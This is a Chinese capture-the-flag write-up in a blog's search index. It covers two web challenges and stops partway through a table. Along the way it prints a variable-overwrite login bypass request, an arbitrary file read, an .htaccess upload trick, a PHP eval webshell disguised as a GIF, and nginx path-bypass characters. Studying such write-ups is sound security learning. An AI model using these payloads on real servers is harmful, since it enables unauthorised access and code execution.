<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2025成都大学玄武杯</title>
    <link href="/2026/02/26/2025%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AF/"/>
    <url>/2026/02/26/2025%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ez-file"><a href="#ez-file" class="headerlink" title="ez_file"></a>ez_file</h2><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251031225346765.png" alt="image-20251031225346765"></p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251031225323056.png" alt="image-20251031225323056"></p><p>说是有泄漏，那就直接开扫</p><p>扫到压缩包</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251031225419063.png" alt="image-20251031225419063"></p><p>压缩包里包含了index.php和login.php</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251031225505973.png" alt="image-20251031225505973"></p><p>直接开始审计代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#悄悄的，校内赛道第一个找到学长的秘密的私信学长秘密内容给奶茶喝</span><br><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">#header(&#x27;Content-Type: application/json&#x27;);</span><br><br><br><span class="hljs-variable">$params</span> = [];<br><span class="hljs-variable">$role</span> = <span class="hljs-string">&quot;guest&quot;</span>;<br><span class="hljs-variable">$admin_role</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;CONTENT_TYPE&quot;</span>] , <span class="hljs-string">&quot;application/json&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-variable">$raw</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$raw</span>, <span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">json_last_error</span>() === JSON_ERROR_NONE) &#123;<br>        <span class="hljs-variable">$params</span> = <span class="hljs-variable">$data</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>            <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$value</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;Invalid JSON&quot;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 如果是普通表单请求</span><br><span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] === <span class="hljs-string">&quot;POST&quot;</span>) &#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] ;<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] ;<br><span class="hljs-comment">//    $params = [&#x27;username&#x27; =&gt; $username, &#x27;password&#x27; =&gt; $password];</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;Unsupported request method&quot;</span>]);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-variable">$client_ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] ;<br><br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable">$password</span> === <span class="hljs-string">&quot;456789&quot;</span> &amp;&amp; <span class="hljs-variable">$client_ip</span> === <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;role&#x27;</span>] = <span class="hljs-variable">$admin_role</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>        <span class="hljs-string">&quot;status&quot;</span> =&gt; <span class="hljs-string">&quot;success&quot;</span>,<br>        <span class="hljs-string">&quot;message&quot;</span> =&gt; <span class="hljs-string">&quot;Login successful (local admin)&quot;</span>,<br>        <span class="hljs-string">&quot;ip&quot;</span> =&gt; <span class="hljs-variable">$client_ip</span><br>    ]);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> === <span class="hljs-string">&quot;guest&quot;</span> &amp;&amp; <span class="hljs-variable">$password</span> === <span class="hljs-string">&quot;123456&quot;</span>) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;role&#x27;</span>] = <span class="hljs-variable">$role</span>;<br>    <span class="hljs-comment">#echo $role;</span><br>    <span class="hljs-comment">#echo json_encode([&quot;status&quot; =&gt; &quot;success&quot;, &quot;message&quot; =&gt; &quot;Login successful&quot;, &quot;user&quot; =&gt; $username]);</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">401</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&quot;status&quot;</span> =&gt; <span class="hljs-string">&quot;failed&quot;</span>, <span class="hljs-string">&quot;message&quot;</span> =&gt; <span class="hljs-string">&quot;Invalid username or password&quot;</span>]);<br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br><br><br></code></pre></td></tr></table></figure><p>大概结果就是要利用代码中的<strong>变量覆盖</strong></p><p>而且看样子是有两种过关方式</p><p>我这里采用第一种</p><p>具体操作：</p><ol><li>发送一个<code>Content-Type</code>为<code>application/json</code>的POST请求</li><li>在JSON体中覆盖<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>为<code>127.0.0.1</code></li><li>同时用户名和密码为<strong>admin</strong>和<strong>456789</strong></li></ol><p>请求包如下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node10.anna.nssctf.cn:28082<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>118<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node10.anna.nssctf.cn:28082<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node10.anna.nssctf.cn:28082/login.html<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_648a44a949074de73151ffaa0a832aec=1743034914,1743123491,1743129758,1744611955<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">    <span class="hljs-attr">&quot;_SERVER&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">        <span class="hljs-attr">&quot;REMOTE_ADDR&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span></span><br><span class="language-json">    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">    <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;456789&quot;</span></span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>返回成功</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251031225852964.png" alt="image-20251031225852964"></p><p>然后就可以直接访问index.php了</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251031230030105.png" alt="image-20251031230030105"></p><p>文件上传，这时候就该去审计index.php了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>    session_start();<br>    error_reporting(0);<br><br><br>    $secret = rtrim(file_get_contents(&quot;/secret&quot;), &quot;\r\n&quot;);<br><br>    if(isset($_GET[&#x27;secret&#x27;]))&#123;<br>        if($_GET[&#x27;secret&#x27;] !== $secret) &#123;<br><br>        header(&quot;Location: login.html&quot;);<br>        exit;<br>        &#125;<br>    &#125;<br>    else if (!isset($_SESSION[&#x27;role&#x27;]) || $_SESSION[&#x27;role&#x27;] !== &#x27;admin&#x27;) &#123;<br>        header(&quot;Location: login.html&quot;);<br>        exit;<br>&#125;<br>?&gt;<br><br><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Image Store&lt;/title&gt;<br>    &lt;link rel=&quot;stylesheet&quot; href=&quot;static/style.css&quot;&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;div class=&quot;container&quot;&gt;<br>    &lt;div class=&quot;title&quot;&gt;Image Store&lt;/div&gt;<br>    &lt;form action = &quot;/&quot; method = &quot;POST&quot; enctype = &quot;multipart/form-data&quot;&gt;<br>        &lt;input type = &quot;file&quot; name = &quot;file&quot; /&gt;<br>        &lt;input type = &quot;submit&quot; value=&quot;Upload&quot;/&gt;<br>    &lt;/form&gt;<br><br>    &lt;?php<br>    if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123;<br>        $fileType = strtolower(pathinfo($_FILES[&#x27;file&#x27;][&#x27;name&#x27;], PATHINFO_EXTENSION));<br><br>        $data = file_get_contents($_FILES[&#x27;file&#x27;][&quot;tmp_name&quot;]);<br><br>        $type = mime_content_type($_FILES[&#x27;file&#x27;][&quot;tmp_name&quot;]);<br><br><br>        if ($_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 1000) &#123;<br>            echo &quot;file too large&quot;;<br>            return;<br>        &#125;<br><br>        #文件后缀白名单检测，我就不信你还能上传php文件，嘻嘻嘻<br>        if(!in_array($fileType, [&quot;jpg&quot;,&quot;png&quot;,&quot;gif&quot;,&quot;jpeg&quot;]))&#123;<br>            echo &quot;file type not allow&quot;;<br>            return;<br>        &#125;<br><br><br><br>        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&quot;tmp_name&quot;], &quot;./uploads/&quot; . md5($_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.jpg&quot;)) &#123;<br>            echo &quot;upload success&quot;;<br>            echo &quot;&lt;br&gt;&quot;;<br>            echo &quot;upload to ./uploads/&quot;.md5($_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.jpg&quot;;<br>        &#125; else &#123;<br>            echo &quot;upload failed&quot;;<br>        &#125;<br>    &#125;<br>    ?&gt;<br><br>&lt;?php<br>    $black_list=[&quot;php&quot;, &quot;phtml&quot;, &quot;php3&quot;, &quot;php4&quot;, &quot;php5&quot;, &quot;pht&quot;];<br>    if(isset($_GET[&#x27;old_name&#x27;]) &amp;&amp; isset($_GET[&#x27;new_name&#x27;]))&#123;<br>        $name = strtolower(pathinfo($_GET[&#x27;new_name&#x27;], PATHINFO_EXTENSION));<br>        if(in_array($name,$black_list))&#123;<br>            echo &quot;我不想看到php文件&quot;;<br>            return;<br>        &#125;<br><br>        $data = file_get_contents($_GET[&#x27;old_name&#x27;]);<br>        if(empty($data))&#123;<br>            echo &quot;怎么没有东西，这我改什么&quot;;<br>            return;<br>        &#125;<br>        $file = tmpfile();<br>        fwrite($file, $data);<br>        fflush($file);<br>        fclose($file);<br><br><br>        file_put_contents(&quot;./uploads/&quot;.$_GET[&#x27;new_name&#x27;],$data);<br>        echo &quot;文件重命名成功&quot;;<br>    &#125;<br>    ?&gt;<br><br>    &lt;div class=&quot;files&quot;&gt;<br>        &lt;?php<br>        $files = scandir(&quot;./uploads/&quot;);<br>        foreach ($files as $file) &#123;<br>            if($file != &quot;.&quot; &amp;&amp; $file != &quot;..&quot;) &#123;<br>                if (is_file(&#x27;./uploads/&#x27; . $file)) &#123;<br>                    ?&gt;<br>                    &lt;a href=&quot;./uploads/&lt;?=$file?&gt;&quot;&gt;&lt;?=$file?&gt;&lt;/a&gt;<br>                &lt;?php &#125;&#125;&#125; ?&gt;<br>    &lt;/div&gt;<br>&lt;/div&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>审计发现</p><p>以下两段代码，可以获取secret</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><br>    <span class="hljs-variable">$secret</span> = <span class="hljs-title function_ invoke__">rtrim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/secret&quot;</span>), <span class="hljs-string">&quot;\r\n&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;secret&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;secret&#x27;</span>] !== <span class="hljs-variable">$secret</span>) &#123;<br><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.html&quot;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;role&#x27;</span>]) || <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;role&#x27;</span>] !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.html&quot;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br> <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;old_name&#x27;</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$data</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;怎么没有东西，这我改什么&quot;</span>;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">tmpfile</span>();<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-title function_ invoke__">fflush</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br><br><br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;./uploads/&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new_name&#x27;</span>],<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件重命名成功&quot;</span>;<br></code></pre></td></tr></table></figure><p>主要就是将secret重命名为secret.jpg，然后下载，用记事本打开即可读取了</p><p>传入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">old_name</span>=/secret&amp;new_name=secret.jpg<br></code></pre></td></tr></table></figure><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251031231148165.png" alt="image-20251031231148165"></p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251031231211604.png" alt="image-20251031231211604"></p><p>回归正题</p><p>大概的思路就是，<strong>利用重命名，上传.htaccess文件</strong>，因为上传的文件会被重命名，且有白名单限制</p><p>所以只能上传一个内容为</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><p>的jpg2php.jpg</p><p>然后再将其重命名为.htaccess，因为重命名的黑名单只有php那几个后缀，所以可行</p><p><strong>上传jpg2php.jpg：</strong></p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251031233848743.png" alt="image-20251031233848743"></p><p><strong>重命名</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">old_name</span>=uploads/7cf2a71af8754bb6f2ec03e5e2fda8b7.jpg&amp;new_name=.htaccess<br></code></pre></td></tr></table></figure><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251031234018129.png" alt="image-20251031234018129"></p><p><strong>接着上传带有php一句话的.jpg</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br> <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;123&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251031234446441.png" alt="image-20251031234446441"></p><p>上传成功</p><p><strong>使用蚁剑连接</strong></p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251031234540880.png" alt="image-20251031234540880"></p><p>flag就在根目录下</p><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251031234642772.png" alt="image-20251031234642772"></p><h2 id="眼见不一定为实"><a href="#眼见不一定为实" class="headerlink" title="眼见不一定为实"></a>眼见不一定为实</h2><p><img src="/images/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AFwp/image-20251101003312367.png" alt="image-20251101003312367"></p><p>下载附件后，结合着该页面内容，就是要往&#x2F;secret后面添加特殊字符来绕过nginx解析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">location ~* ^/secret/?$ &#123;<br>    deny <span class="hljs-built_in">all</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">403</span>;<br>&#125;<br><br>location ~* ^/secret/ &#123;<br>    deny <span class="hljs-built_in">all</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">403</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这两段会将路径中存在&#x2F;secret、&#x2F;secret&#x2F;的请求都拦截</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/secret&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">secret</span>():<br>    <span class="hljs-keyword">return</span> os.getenv(<span class="hljs-string">&quot;FLAG&quot;</span>, <span class="hljs-string">&quot;NSSCTF&#123;default&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p>但是我们必须要访问&#x2F;secret才能获取flag</p><p>所以要想办法加特殊字符，绕过这两个限制，并且python能正常解析为&#x2F;secret</p><p>以下是我收集的Bypass</p><p><strong>利用Flask绕过</strong></p><table><thead><tr><th>Nginx 版本</th><th>Flask Bypass Characters</th></tr></thead><tbody><tr><td>1.22.0</td><td><code>\x85</code>,<code>\xA0</code></td></tr><tr><td>1.21.6</td><td><code>\x85</code>,<code>\xA0</code></td></tr><tr><td>1.20.2</td><td><code>\x85</code>,<code>\xA0</code>,<code>\x1F</code>,<code>\x1E</code>,<code>\x1D</code>,<code>\x1C</code>,<code>\x0C</code>,<code>\x0B</code></td></tr><tr><td>1.18.0</td><td><code>\x85</code>,<code>\xA0</code>,<code>\x1F</code>,<code>\x1E</code>,<code>\x1D</code>,<code>\x1C</code>,<code>\x0C</code>,<code>\x0B</code></td></tr><tr><td>1.16.1</td><td><code>\x85</code>,<code>\xA0</code>,<code>\x1F</code>,<code>\x1E</code>,<code>\x1D</code>,<code>\x1C</code>,<code>\x0C</code>,<code>\x0B</code></td></tr></tbody></table><p><strong>利用Node.js绕过</strong></p><table><thead><tr><th>Nginx 版本</th><th>Node.js Bypass</th></tr></thead><tbody><tr><td>1.22.0</td><td><code>\xA0</code></td></tr><tr><td>1.21.6</td><td><code>\xA0</code></td></tr><tr><td>1.20.2</td><td><code>\xA0</code>, <code>\x09</code>,<code>\x0C</code></td></tr><tr><td>1.18.0</td><td><code>\xA0</code>, <code>\x09</code>,<code>\x0C</code></td></tr><tr><td>1.16.1</td><td><code>\xA0</code>, <code>\x09</code>,<code>\x0C</code></td></tr></tbody></table><p><strong>利用spring boot来绕过</strong></p><table><thead><tr><th>Nginx 版本</th><th>Spring Boot 